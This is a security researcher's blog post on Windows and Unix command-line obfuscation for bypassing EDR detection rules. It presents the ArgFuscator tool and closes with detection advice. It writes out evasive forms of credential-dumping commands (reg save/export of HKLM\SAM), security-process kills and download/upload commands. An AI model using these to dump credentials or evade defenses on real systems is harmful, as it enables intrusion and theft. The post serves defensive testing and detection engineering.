# https://www.wietzebeukema.nl/blog/bypassing-detections-with-command-line-obfuscation

<!DOCTYPE html><html lang="en" dir="ltr" style="overflow-y: scroll; overscroll-behavior-y: none;">

<body>
    <main class="wrapper">
        
        <article class="container content">
            <h2 id="edrs-Ô∏è-command-line-arguments">EDRs ‚ù§Ô∏è Command-Line Arguments</h2>

<p>Command-line arguments are weird, I have argued in earlier posts [<a href="https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation">1</a>, <a href="https://www.wietzebeukema.nl/blog/why-bother-with-argv0">2</a>]. Being a key concept in computing, where a program is given some initial input when starting a new process, it is also a principal source for identifying malicious behaviour: defensive software such as <abbr title="Anti Virus">AV</abbr>‚Äãs and <abbr title="Endpoint Detection &amp; Response, commonly found in enterprise">EDR</abbr>‚Äãs analyse all processes‚Äô command lines for possible threat actor activity.</p>

<p>This may be surprising to some, as computer defenses traditionally used to focus on the identification of malicious executables: historically via malware signatures, later assisted by malware heuristics.</p>

<p>As of 2025, this approach no longer suffices. An ongoing trend that began more than five years ago has shown a surge in so-called ‚Äòmalwareless intrusions‚Äô [<a href="https://doi.org/10.5815/ijcnis.2017.07.01">3</a>]. This is defined as a successful compromise where no malicious binaries were involved. Instead, threat actors resort in such attacks to:</p>

<ol>
  <li><strong>System-native scripting languages</strong>, such as PowerShell on Windows or bash on Linux and macOS;</li>
  <li><strong>System-native executables</strong>, also known as <em>Living-of-the-Land binaries</em> or LOLBINs&nbsp;[<a href="https://lolbas-project.github.io/">4</a>]; and,</li>
  <li><strong>Legitimate/trusted third-party executables</strong>, for example, remote management and monitoring software such as TeamViewer and AnyDesk.</li>
</ol>

<p>In 2024, well over 3 in every 4 intrusions observed by cyber security firm CrowdStrike was fully malwareless&nbsp;[<a href="https://www.crowdstrike.com/en-us/global-threat-report/">5</a>]. From an attacker standpoint, this shift is easily explained: why invest in writing complicated malware when other, trusted tools can achieve the same? It typically requires less skill; and perhaps most crucially, the chances of getting detected may be lower as well, since distinguishing legitimate from malicious use can be hard.</p>

<p>Consider for example <code class="language-plaintext highlighter-rouge">taskkill</code> on Windows or <code class="language-plaintext highlighter-rouge">kill</code> on Linux and macOS. Designed to terminate running processes, this legitimate and trusted executable is present in virtually all OS versions, and its file hash is highly unlikely to be blocked by defensive software. As such, the risk of getting detected when killing a process via this system-native utility is lower than when doing so from a malware binary, as the latter is more likely to set off alarm bells: unknown/low-prevalence programs invoking system calls to terminate other (system) processes is suspicious in itself, after all. Instead, the former is likely to blend in better with benign usage of the tool.</p>

<p>In response to this, security solutions have become increasingly concerned about whether the <em>behaviour</em> of a program is benign or malicious. Although there are many ways in which this can be achieved, a simple, low-hanging-fruit way of achieving this is analysing command-line arguments to understand the <em>intent</em> of a program execution. Ultimately, command lines are highly valuable in assessing this: for example, <code class="language-plaintext highlighter-rouge">taskkill /f /im winword.exe</code> has a very different risk profile than <code class="language-plaintext highlighter-rouge">taskkill /f /im security_process.exe</code> [<a href="https://github.com/SigmaHQ/sigma/blob/598d29f811c1859ba18e05b8c419cc94410c9a55/rules/windows/process_creation/proc_creation_win_taskkill_sep.yml#L22-L26">6</a>].</p>

<h2 id="threat-actors--command-line-arguments">Threat Actors ü•∏ Command-Line Arguments</h2>

<p>To counter this, threat actors have been observed [<a href="https://x.com/cyb3rops/status/1029818856557215744">7</a>] to avoid such command-line detections by tweaking what command-line arguments they use. This technique, better known as command-line obfuscation [<a href="https://attack.mitre.org/techniques/T1027/010/">8</a>], is an attempt to masquerade the true intention of a command with the ultimate goal of bypassing threat detection or misleading an analyst.</p>

<p>Command-line obfuscation is different from other types of command obfuscation such as DOSfuscation or PowerShell obfuscation [<a href="https://services.google.com/fh/files/misc/exploring-the-depths-of-cmd-exe-obfuscation-wp-en.pdf">9</a>, <a href="https://github.com/danielbohannon/Invoke-Obfuscation">10</a>] in that it is not shell dependent: it is the target executable that is vulnerable, and therefore it does not matter in what context the process creation happens. As a result, another key difference is that the obfuscated command line is passed on <strong>fully obfuscated</strong> to an <abbr title="Endpoint Detection &amp; Response, commonly found in enterprise">EDR</abbr>, whereas e.g. DOSfuscation techniques starting new processes typically result in resolved, unobfuscated command lines.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2025-03-24-dosfuscation.jpg"><img src="https://www.wietzebeukema.nl/assets/2025-03-24-dosfuscation.jpg" alt="Screenshot showing DOSfuscation successfully obfuscating a command, but with the certutil execution ultimately showing up in unobfuscated form in ProcMon."></a>
<em>Screenshot showing  DOSfuscation [<a href="https://services.google.com/fh/files/misc/exploring-the-depths-of-cmd-exe-obfuscation-wp-en.pdf">9</a>] successfully obfuscating a command, but with the <code class="language-plaintext highlighter-rouge">certutil</code> execution ultimately showing up in unobfuscated form in ProcMon [<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon">24</a>].</em></p>

<p>This means that command-line obfuscation may, unlike the other obfuscation types, have a higher success rate in bypassing defensive measures. Command-line obfuscation can take many forms; sometimes, techniques are applied in isolation, while other times, multiple techniques are combined. To bring the concept of command-line obfuscation to live, consider the following examples:</p>

<h3 id="windows">Windows</h3>

<p>In an earlier blog post [<a href="https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation">1</a>], I set out various techniques for Windows in which this can be achieved, including:</p>

<ul>
  <li><strong>Option character substitution</strong>: <br><code class="language-plaintext highlighter-rouge">taskkill -f -im ccSvcHst.exe</code> instead of <code class="language-plaintext highlighter-rouge">taskkill /f /im ccSvcHst.exe</code>, bypassing e.g. [<a href="https://github.com/SigmaHQ/sigma/blob/598d29f811c1859ba18e05b8c419cc94410c9a55/rules/windows/process_creation/proc_creation_win_taskkill_sep.yml#L22-L26">6</a>],</li>
  <li><strong>Character substitution</strong>: <code class="language-plaintext highlighter-rouge">reg eÀ£port HKLM\SAM out.reg</code>, bypassing e.g. [<a href="https://github.com/SigmaHQ/sigma/blob/3ce034bb201fda14a391f1ad9111340b8dbea428/deprecated/windows/proc_creation_win_credential_acquisition_registry_hive_dumping.yml#L23">11</a>],</li>
  <li><strong>Character insertion</strong>: <code class="language-plaintext highlighter-rouge">reg sa‚öΩve HKLM\SAM out.reg</code>, bypassing e.g. [<a href="https://github.com/elastic/detection-rules/blob/c0f12ddecfb02ecf36e0efff14d2cd21e823fa61/rules/windows/credential_access_dump_registry_hives.toml#L93">12</a>],</li>
  <li><strong>Quotes insertion</strong>: <code class="language-plaintext highlighter-rouge">reg "s"a"v"e H"KL"M\S"AM" out.reg</code>, bypassing e.g. [<a href="https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/attempted_credential_dump_from_registry_via_reg_exe.yml#L13">13</a>]; and,</li>
  <li><strong>Character deletion</strong>: <code class="language-plaintext highlighter-rouge">powershell -en ‚Ä¶</code> instead of <code class="language-plaintext highlighter-rouge">powershell -encodedcommand ‚Ä¶</code>, bypassing e.g. [<a href="https://github.com/reprise99/Sentinel-Queries/blob/3102a56d0f081441a0b73c906ceed227fa93701b/Defender%20for%20Endpoint/Device-DetectEncodedPowershellandDecode.kql#L8-L11">14</a>].</li>
</ul>

<p>Additional techniques include:</p>

<ul>
  <li><strong>Value transformations</strong>: <code class="language-plaintext highlighter-rouge">ping 2130706433</code> instead of <code class="language-plaintext highlighter-rouge">ping 127.0.0.1</code>, bypassing e.g. [<a href="https://github.com/SigmaHQ/sigma/blob/3ce034bb201fda14a391f1ad9111340b8dbea428/rules-emerging-threats/2019/Malware/QBot/proc_creation_win_malware_qbot.yml#L23">15</a>],</li>
  <li><strong>Path traversal</strong>: <code class="language-plaintext highlighter-rouge">mshta c:\windows\system32\..\temp\evil.hta</code>, bypassing e.g. [<a href="https://github.com/SigmaHQ/sigma/blob/598d29f811c1859ba18e05b8c419cc94410c9a55/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml#L37">16</a>]; and,</li>
  <li><strong>URL manipulation</strong>: <code class="language-plaintext highlighter-rouge">msiexec https:\\example.org/install.msi</code> instead of using <code class="language-plaintext highlighter-rouge">https://</code>, bypassing e.g. [<a href="https://github.com/splunk/security_content/blob/76a9a02c9e7826721e8867d5838c84a7768d068c/detections/endpoint/windows_msiexec_remote_download.yml#L19-L24">17</a>].</li>
</ul>

<p><a href="https://www.wietzebeukema.nl/assets/2025-03-24-argfuscation.jpg"><img src="https://www.wietzebeukema.nl/assets/2025-03-24-argfuscation.jpg" alt="Screenshot demonstrating that command-line obfuscation shows in obfuscated form in ProcMon, unlike DOSfuscation."></a>
<em>Screenshot demonstrating that command-line obfuscation of <code class="language-plaintext highlighter-rouge">certutil</code> shows in obfuscated form in ProcMon, unlike DOSfuscation.</em></p>

<h3 id="linux-and-macos">Linux and macOS</h3>

<p>Although less ‚Äòwild‚Äô than Windows, *nix-based operating systems offer their own type obfuscation opportunities:</p>

<ul>
  <li><strong>Character deletion</strong>: <code class="language-plaintext highlighter-rouge">curl --upload-f file.txt example.org</code> instead of <code class="language-plaintext highlighter-rouge">--upload-file</code>, bypassing e.g. [<a href="https://github.com/splunk/security_content/blob/fdaa038eab70c41517d8e8290c4f522154b7e238/detections/endpoint/linux_curl_upload_file.yml#L18-L25">18</a>],</li>
  <li><strong>Option reordering/stuffing</strong>: <code class="language-plaintext highlighter-rouge">bash -lc ‚Ä¶</code> instead of <code class="language-plaintext highlighter-rouge">bash -c ‚Ä¶</code> or <code class="language-plaintext highlighter-rouge">bash -c -l ‚Ä¶</code>, bypassing e.g. [<a href="https://github.com/elastic/detection-rules/blob/059d7efa25adab2f2c43b87efca9bfaad887aaa7/rules/linux/command_and_control_ip_forwarding_activity.toml#L78">19</a>],</li>
  <li><strong>Option separator insertion</strong>: <code class="language-plaintext highlighter-rouge">wget -O - example.org</code> instead of <code class="language-plaintext highlighter-rouge">wget -O- example.org</code>, bypassing e.g. [<a href="https://github.com/splunk/security_content/blob/fdaa038eab70c41517d8e8290c4f522154b7e238/detections/endpoint/wget_download_and_bash_execution.yml#L23">20</a>],</li>
  <li><strong>Option separator deletion</strong>: <code class="language-plaintext highlighter-rouge">osascript -e"log 'hi'"</code> instead of <code class="language-plaintext highlighter-rouge">osascript -e "log 'hi'"</code>, bypassing e.g. [<a href="https://github.com/SigmaHQ/sigma/blob/598d29f811c1859ba18e05b8c419cc94410c9a55/rules/macos/process_creation/proc_creation_macos_applescript.yml#L21">21</a>]</li>
  <li><strong>Value transformation</strong>: <code class="language-plaintext highlighter-rouge">wget https://0177.0.0.0x1</code> instead of <code class="language-plaintext highlighter-rouge">wget https://127.0.0.1</code> , bypassing e.g. [<a href="https://github.com/SigmaHQ/sigma/blob/78a78c79ffd2998cd864618c538395a4e8c23902/rules-emerging-threats/2023/TA/UNC4841-Barracuda-ESG-Zero-Day-Exploitation/proc_creation_lnx_apt_unc4841_wget_download_tar_files_direct_ip.yml#L19">22</a>].</li>
</ul>

<h2 id="identifying-command-line-obfuscation-opportunities">Identifying command-line obfuscation opportunities</h2>

<p>The above examples show that many executables are vulnerable to command-line obfuscation. However, whether an executable is vulnerable and to which specific obfuscation techniques differs executable to executable. Especially on Windows, previous research [<a href="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/">23</a>] has attempted to shine some light on why certain executables exhibit certain behaviours; in true Microsoft fashion, most of this seems to be attributable to keeping executables backwards compatible between changes in Windows and the Windows API. That said, based on my own testing, there did not appear to be any consistency with how command-line obfuscation techniques could be applied to different Windows programs.</p>

<p>Therefore, to understand the full scale of the problem command-line obfuscation imposes, other executables were tested for their susceptibility to the listed obfuscation techniques.</p>

<p><img src="https://www.wietzebeukema.nl/assets/2025-03-24-methodology.svg" alt="Flowchart of the taken approach." width="300" height="150"></p>

<p>First, an application is selected for investigation. For this research, it was decided to focus on commonly used Windows 11 LOLBINs as found in the LOLBAS Project [<a href="https://lolbas-project.github.io/">4</a>] and Atomic Red Team [<a href="https://www.atomicredteam.io/">28</a>], which resulted in a list of 68 Windows executables. The next step is to investigate their susceptibility to the different types of command-line obfuscation that were identified earlier. As a significant portion of this can be automated, the Python module <code class="language-plaintext highlighter-rouge">analyse_obfuscation</code> [<a href="https://github.com/wietze/windows-command-line-obfuscation">29</a>] was used for this: it runs a given command line thousands of times in parallel with various obfuscation options applied, validating whether the exit code and output on the stdout are the same as the original version. The module provides a textual output with found command lines that are deemed to be synonymous.</p>

<p>Based on these observations, a model file is constructed to define the available obfuscation options, their application order, and the command-line argument types they affect. For example, the previous step may have identified that <code class="language-plaintext highlighter-rouge">reg eÀ£port HKLM\SAM example.reg</code> is a valid command; however, that does not mean that <em>any</em> x can be replaced by À£. For example, <code class="language-plaintext highlighter-rouge">reg export HKLM\SAM eÀ£ample.reg</code> will create a file called <code class="language-plaintext highlighter-rouge">eÀ£ample.reg</code> (i.e., the unicode character is preserved) instead of <code class="language-plaintext highlighter-rouge">example.reg</code>, and is therefore not synonymous. Thus, our model file specifies that character substitution is available, but should only applied to regular command line arguments, and not to e.g. file paths or URLs.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"tokens"</span><span class="p">:</span><span class="w"> </span><span class="p">[{</span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"reg"</span><span class="p">},</span><span class="w"> </span><span class="p">{</span><span class="nl">"argument"</span><span class="p">:</span><span class="w"> </span><span class="s2">"export"</span><span class="p">},</span><span class="w"> </span><span class="p">{</span><span class="nl">"reg_path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"HKLM</span><span class="se">\\</span><span class="s2">SAM"</span><span class="p">},</span><span class="w"> </span><span class="p">{</span><span class="nl">"file_path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"example.reg"</span><span class="p">}],</span><span class="w">
    </span><span class="nl">"modifiers"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"CharacterSubstitution"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"Mapping"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nl">"a"</span><span class="p">:</span><span class="w"> </span><span class="s2">"·µÉ"</span><span class="p">,</span><span class="w"> </span><span class="nl">"b"</span><span class="p">:</span><span class="w"> </span><span class="s2">"·µá"</span><span class="p">,</span><span class="w"> </span><span class="nl">"c"</span><span class="p">:</span><span class="w"> </span><span class="s2">"·∂ú"</span><span class="p">,</span><span class="w"> </span><span class="nl">"d"</span><span class="p">:</span><span class="w"> </span><span class="s2">"·µà"</span><span class="p">,</span><span class="w"> </span><span class="nl">"e"</span><span class="p">:</span><span class="w"> </span><span class="s2">"·µâ"</span><span class="p">,</span><span class="w"> </span><span class="nl">"f"</span><span class="p">:</span><span class="w"> </span><span class="s2">"·∂†"</span><span class="p">,</span><span class="w"> </span><span class="nl">"g"</span><span class="p">:</span><span class="w"> </span><span class="s2">"·µç"</span><span class="p">,</span><span class="w"> </span><span class="nl">"h"</span><span class="p">:</span><span class="w"> </span><span class="s2">" ∞"</span><span class="p">,</span><span class="w"> </span><span class="nl">"j"</span><span class="p">:</span><span class="w"> </span><span class="s2">" ≤"</span><span class="p">,</span><span class="w"> </span><span class="nl">"k"</span><span class="p">:</span><span class="w"> </span><span class="s2">"·µè"</span><span class="p">,</span><span class="w"> </span><span class="nl">"l"</span><span class="p">:</span><span class="w"> </span><span class="s2">"À°"</span><span class="p">,</span><span class="w"> </span><span class="nl">"m"</span><span class="p">:</span><span class="w"> </span><span class="s2">"·µê"</span><span class="p">,</span><span class="w"> </span><span class="nl">"n"</span><span class="p">:</span><span class="w"> </span><span class="s2">"‚Åø"</span><span class="p">,</span><span class="w"> </span><span class="nl">"o"</span><span class="p">:</span><span class="w"> </span><span class="s2">"·µí"</span><span class="p">,</span><span class="w"> </span><span class="nl">"p"</span><span class="p">:</span><span class="w"> </span><span class="s2">"·µñ"</span><span class="p">,</span><span class="w"> </span><span class="nl">"r"</span><span class="p">:</span><span class="w"> </span><span class="s2">" ≥"</span><span class="p">,</span><span class="w"> </span><span class="nl">"s"</span><span class="p">:</span><span class="w"> </span><span class="s2">"À¢"</span><span class="p">,</span><span class="w"> </span><span class="nl">"t"</span><span class="p">:</span><span class="w"> </span><span class="s2">"·µó"</span><span class="p">,</span><span class="w"> </span><span class="nl">"u"</span><span class="p">:</span><span class="w"> </span><span class="s2">"·µò"</span><span class="p">,</span><span class="w"> </span><span class="nl">"v"</span><span class="p">:</span><span class="w"> </span><span class="s2">"‚±Ω"</span><span class="p">,</span><span class="w"> </span><span class="nl">"w"</span><span class="p">:</span><span class="w"> </span><span class="s2">" ∑"</span><span class="p">,</span><span class="w"> </span><span class="nl">"x"</span><span class="p">:</span><span class="w"> </span><span class="s2">"À£"</span><span class="p">,</span><span class="w"> </span><span class="nl">"y"</span><span class="p">:</span><span class="w"> </span><span class="s2">" ∏"</span><span class="p">,</span><span class="w"> </span><span class="nl">"z"</span><span class="p">:</span><span class="w"> </span><span class="s2">"·∂ª"</span><span class="p">},</span><span class="w">
            </span><span class="nl">"AppliesTo"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"argument"</span><span class="p">]</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"RandomCase"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"AppliesTo"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"argument"</span><span class="p">,</span><span class="w"> </span><span class="s2">"file_path"</span><span class="p">,</span><span class="w"> </span><span class="s2">"command"</span><span class="p">]</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"OptionCharacterSubstitution"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"OptionChars"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"-"</span><span class="p">,</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w"> </span><span class="s2">"</span><span class="se">\u</span><span class="s2">fe63"</span><span class="p">],</span><span class="w">
            </span><span class="nl">"AppliesTo"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"argument"</span><span class="p">]</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"CharacterInsertion"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"Characters"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"</span><span class="se">\u</span><span class="s2">00ad"</span><span class="p">,</span><span class="w"> </span><span class="s2">"</span><span class="se">\u</span><span class="s2">034f"</span><span class="p">,</span><span class="w"> </span><span class="s2">"</span><span class="se">\u</span><span class="s2">0378"</span><span class="p">,</span><span class="w"> </span><span class="err">‚Ä¶</span><span class="p">],</span><span class="w">
            </span><span class="nl">"AppliesTo"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"argument"</span><span class="p">]</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"QuoteInsertion"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"AppliesTo"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"argument"</span><span class="p">,</span><span class="w"> </span><span class="s2">"file_path"</span><span class="p">,</span><span class="w"> </span><span class="s2">"url"</span><span class="p">]</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<p><em>A simplified version of the model files used, in JSON format.</em></p>

<p>As can be seen in the example above, the model file first (see <code class="language-plaintext highlighter-rouge">tokens</code>) specifies a tokenised version of command-line arguments and assigns them their appropriate type. Then (see <code class="language-plaintext highlighter-rouge">modifiers</code>) all command-line obfuscation options are defined with all their relevant parameters, including which command-line argument types they apply to.</p>

<p>The fourth step is to test whether this model as defined is now an accurate representation of the command-line obfuscation options available. To do so, the model file is used to <em>generate</em> an obfuscated command line. Even more interestingly, multiple obfuscation techniques are applied at once, by sequentially applying the specified modifiers with a certain probability. As such, the given example model file may result in <code class="language-plaintext highlighter-rouge">reg eÀ£PO ≥T HK"L"M\SA"M" EX"a"m"PLE.reg"</code>, <code class="language-plaintext highlighter-rouge">Reg ·µâ‡∑µ·ãÜ‡≠ì·∑Øxp·´òÍ¨Ω·µí‚πºR‡µöÍ≠ÇT HKL"M\S"AM ExaMPle.rEG</code>, <code class="language-plaintext highlighter-rouge">rEg ·µâÍÆòXpO ≥Íûò·µó‡Æ¢ HK"L"M\SAM eX"amPLe.R"eG</code>, and so on.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2025-03-24-reg.jpg"><img src="https://www.wietzebeukema.nl/assets/2025-03-24-reg.jpg" alt="Screenshot of the three described reg.exe obfuscation examples in action on a Windows 11 machine."></a>
<em>Screenshot of the three described <code class="language-plaintext highlighter-rouge">reg.exe</code> obfuscation examples in action on a Windows 11 machine.</em></p>

<p>Although this can be done manually, the machine-readable model files allow us to automate this too. For the purposes of this research, <em>Invoke-ArgFuscation</em> [<a href="https://github.com/wietze/Invoke-ArgFuscator">30</a>] was written: a cross-platform PowerShell module that takes model files and generates obfuscated command-line arguments following the provided definition. The probability of applying each step, which can be controlled in the model file itself, means that the output is highly likely to be different every time. Wrapping <em>Invoke-ArgFuscator</em> in minimal PowerShell code allows for the execution of the generated command lines, and validation of the exit code and standard out. Any command lines generating an unexpected output should be assessed, and likely result in adjustments of the model file that generated it. If after a high number of generations the output is consistently as expected (in this research, n=1000 was used), the model file is considered an accurate representation of reality, resulting in the abstraction we were after.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2025-03-24-invoke-argfuscator.jpg"><img src="https://www.wietzebeukema.nl/assets/2025-03-24-invoke-argfuscator.jpg" alt="Screenshot of Invoke-ArgFuscator in action, generating 20 obfuscated versions of our reg.exe command."></a>
<em>Screenshot of Invoke-ArgFuscator [<a href="https://github.com/wietze/Invoke-ArgFuscator">30</a>] in action, generating 20 obfuscated versions of our <code class="language-plaintext highlighter-rouge">reg.exe</code> command.</em></p>

<h2 id="findings-a-new-platform-argfuscatornet-">Findings: a new platform, ArgFuscator.net üöÄ</h2>

<p>Having applied this approach to 68 Windows executables resulted in an equal amount of model files, that have been validated against Windows 11 23H2. The executables in question are <code class="language-plaintext highlighter-rouge">addinutil</code>, <code class="language-plaintext highlighter-rouge">adfind</code>, <code class="language-plaintext highlighter-rouge">arp</code>, <code class="language-plaintext highlighter-rouge">aspnet_compiler</code>, <code class="language-plaintext highlighter-rouge">at</code>, <code class="language-plaintext highlighter-rouge">auditpol</code>, <code class="language-plaintext highlighter-rouge">bcdedit</code>, <code class="language-plaintext highlighter-rouge">bitsadmin</code>, <code class="language-plaintext highlighter-rouge">cacls</code>, <code class="language-plaintext highlighter-rouge">certreq</code>, <code class="language-plaintext highlighter-rouge">certutil</code>, <code class="language-plaintext highlighter-rouge">cipher</code>, <code class="language-plaintext highlighter-rouge">cmdkey</code>, <code class="language-plaintext highlighter-rouge">cmstp</code>, <code class="language-plaintext highlighter-rouge">csc</code>, <code class="language-plaintext highlighter-rouge">cscript</code>, <code class="language-plaintext highlighter-rouge">curl</code>, <code class="language-plaintext highlighter-rouge">dism</code>, <code class="language-plaintext highlighter-rouge">driverquery</code>, <code class="language-plaintext highlighter-rouge">expand</code>, <code class="language-plaintext highlighter-rouge">extrac32</code>, <code class="language-plaintext highlighter-rouge">findstr</code>, <code class="language-plaintext highlighter-rouge">fltmc</code>, <code class="language-plaintext highlighter-rouge">forfiles</code>, <code class="language-plaintext highlighter-rouge">fsutil</code>, <code class="language-plaintext highlighter-rouge">ftp</code>, <code class="language-plaintext highlighter-rouge">icacls</code>, <code class="language-plaintext highlighter-rouge">ipconfig</code>, <code class="language-plaintext highlighter-rouge">jsc</code>, <code class="language-plaintext highlighter-rouge">makecab</code>, <code class="language-plaintext highlighter-rouge">msbuild</code>, <code class="language-plaintext highlighter-rouge">msiexec</code>, <code class="language-plaintext highlighter-rouge">nbtstat</code>, <code class="language-plaintext highlighter-rouge">net</code> (and <code class="language-plaintext highlighter-rouge">net1</code>), <code class="language-plaintext highlighter-rouge">netsh</code>, <code class="language-plaintext highlighter-rouge">netstat</code>, <code class="language-plaintext highlighter-rouge">nltest</code>, <code class="language-plaintext highlighter-rouge">nslookup</code>, <code class="language-plaintext highlighter-rouge">ping</code>, <code class="language-plaintext highlighter-rouge">pnputil</code>, <code class="language-plaintext highlighter-rouge">powershell</code> (and <code class="language-plaintext highlighter-rouge">pwsh</code>), <code class="language-plaintext highlighter-rouge">procdump</code>, <code class="language-plaintext highlighter-rouge">psexec</code>, <code class="language-plaintext highlighter-rouge">query</code>, <code class="language-plaintext highlighter-rouge">reg</code>, <code class="language-plaintext highlighter-rouge">regedit</code>, <code class="language-plaintext highlighter-rouge">regsvr32</code>, <code class="language-plaintext highlighter-rouge">robocopy</code>, <code class="language-plaintext highlighter-rouge">route</code>, <code class="language-plaintext highlighter-rouge">rpcping</code>, <code class="language-plaintext highlighter-rouge">runas</code>, <code class="language-plaintext highlighter-rouge">sc</code>, <code class="language-plaintext highlighter-rouge">schtasks</code>, <code class="language-plaintext highlighter-rouge">secedit</code>, <code class="language-plaintext highlighter-rouge">takeown</code>, <code class="language-plaintext highlighter-rouge">tar</code>, <code class="language-plaintext highlighter-rouge">taskkill</code>, <code class="language-plaintext highlighter-rouge">tasklist</code>, <code class="language-plaintext highlighter-rouge">vaultcmd</code>, <code class="language-plaintext highlighter-rouge">vbc</code>, <code class="language-plaintext highlighter-rouge">w32tm</code>, <code class="language-plaintext highlighter-rouge">wevtutil</code>, <code class="language-plaintext highlighter-rouge">where</code>, <code class="language-plaintext highlighter-rouge">whoami</code>, <code class="language-plaintext highlighter-rouge">winget</code>, <code class="language-plaintext highlighter-rouge">wmic</code>, <code class="language-plaintext highlighter-rouge">wscript</code>, and <code class="language-plaintext highlighter-rouge">xcopy</code>.</p>

<p>With the introduction of <em>ArgFuscator.net</em> [<a href="https://argfuscator.net/">31</a>], all results are now accessible for those interested in command-line obfuscation. For defenders, it is a rich resource outlining command-line obfuscation options to be aware of when writing detection content. Every executable assessed as part of this research has their own dedicated page [<a href="https://github.com/wietze/ArgFuscator.net/">32</a>], specifying the types of command-line obfuscation as well as their parameters.</p>

<p>The project doesn‚Äôt stop there: it also offers the option to obfuscate a user-given command line, using the findings of this research. For any of the 68 supported executables, simply pasting in a command one wishes to obfuscate and clicking ‚ÄúApply obfuscation‚Äù will generate a synonymous command line that according to our research will work as well. The website comes with an advanced editor that allows users to disable certain obfuscation types, change the probability with which techniques are applied, or even write their own model files.</p>

<video width="100%" controls="" loop="">
  <source src="https://www.wietzebeukema.nl/assets/2025-03-24-argfuscator-net.h264.mp4" type="video/mp4; codecs=&quot;avc1.64002A&quot;">
  <source src="https://www.wietzebeukema.nl/assets/2025-03-24-argfuscator-net.mp4" type="video/mp4; codecs=&quot;avc1.42E01E&quot;">
  <source src="https://www.wietzebeukema.nl/assets/2025-03-24-argfuscator-net.webm" type="video/webm; codecs=&quot;vp9&quot;">
  (A video demonstrating how a `certutil.exe` command attempting to download a file is blocked by Windows Defender, but when obfuscated using _ArgFuscator.net_, it works without issue.)
</video>
<p><em>A video demonstrating how a <code class="language-plaintext highlighter-rouge">certutil.exe</code> command attempting to download a file [<a href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/#download">33</a>] is blocked by Windows Defender, but when obfuscated using <a href="https://argfuscator.net/">ArgFuscator.net</a>, it works without issue.</em></p>

<p>As the above video shows, it offers those in defensive security the opportunity to test, with practical examples, how resilient their detections and defence mechanisms are.</p>

<p>The project is fully open-source [<a href="https://github.com/wietze/ArgFuscator.net/">32</a>], and the website itself is hosted on GitHub. Although all processing happens entirely within the browser (the obfuscation engine is written in TypeScript) and none of the inputs are logged, it is possible to deploy a self-hosted instance or leverage the previously mentioned Invoke-ArgFuscator [<a href="https://github.com/wietze/Invoke-ArgFuscator">30</a>] to obfuscate command-line arguments offline. Also note that since this research focussed on Windows, support for Linux and macOS commands has not been added to the platform yet - this is on the roadmap for later this year.</p>

<h2 id="prevention-and-detection">Prevention and detection</h2>

<p>Despite the high number of obfuscation options that are available to many executables, detecting abuse doesn‚Äôt have to be hard.</p>

<p>For example, a single detection rule looking for command-line arguments containing characters high up in the Unicode range might be a catch-all for character insertion/substitution obfuscation techniques across all executables. In many environments, this is likely to be rare, especially if you limit the processes of interest to the ones included in this research. Another example is identifying anomalies on the command line, such as detecting a high number of quotes [<a href="https://www.linkedin.com/posts/0x534c_cybersecurity-argfuscator-kqlobfusguard-activity-7296880904411521024-bWAK">25</a>] or a high variation in upper- and lowercase characters [<a href="https://twitter.com/mthcht/status/1888605609194295307">26</a>]. Furthermore, as a general recommendation, writing resillient detections is good practice: define detection logic in a way that detect keywords of interest, even when obfuscation is applied. With the launch or ArgFuscator, defenders have a powerful tool that specifies what obfuscation types they should be aware of when writing detections.</p>

<p>From a detection pipeline view, it is also worth normalising command-line arguments prior to evaluating them against detection logic. For example, Windows Defender for Endpoint offers a feature that parses a process‚Äô command line, effectively getting rid of any double quotes that may obstruct keyword detection [<a href="https://learn.microsoft.com/en-us/kusto/query/parse-command-line-function">27</a>]. It may be even worth flagging command lines where the parsed version deviates highly from the unparsed version.</p>

